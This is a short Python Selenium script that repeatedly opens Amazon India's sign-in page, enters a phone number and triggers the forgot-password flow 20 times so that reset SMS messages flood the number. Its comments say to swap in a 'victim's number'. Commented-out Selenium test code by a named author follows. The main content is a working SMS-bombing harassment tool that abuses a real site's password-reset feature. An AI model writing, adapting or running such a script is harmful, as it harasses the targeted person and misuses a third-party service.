from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
for i in range(20):
	# create instance of Chrome webdriver
	driver=webdriver.Chrome()
	driver.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2Fgp%2Fcss%2Fhomepage.html%3Ffrom%3Dhz%26ref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")

	# find the element where we have to
	# enter the xpath
	# target mobile number, change it to victim's number and
	# also ensure that it's registered on flipkart

	driver.find_element_by_xpath('//*[@id="ap_email"]').send_keys('xxxx6126')
	# find the element continue
	# request using xpath
	# clicking on that element

	driver.find_element_by_xpath('//*[@id="continue"]').click()
	# find the element to send a forgot password
	# request using xpath

	driver.find_element_by_xpath('//*[@id="auth-fpp-link-bottom"]').click()
	driver.find_element_by_xpath('//*[@id="continue"]').click()

	# set the interval to send each sms
	time.sleep(4)

	# Close the browser
	driver.close()











































#import time

#author name- sharad Tiwari

#from selenium import webdriver
#from selenium.webdriver.common.keys import Keys

#driver = webdriver.Chrome()

#driver = webdriver.Firefox()

#driver.get("https://www.amazon.com/")
#print(driver.title)
#driver.find_element_by_xpath("//*[@id='nav-link-accountList']/div").click()
#String ActualTitle = driver.getTitle();
#String ExpectedTitle = "Home - amazon";
#Assert.assertEquals(ExpectedTitle,ActualTitle);



#time.sleep(5)
#driver.close()    #currently focused browser
#driver.quit()     #closes all the browser
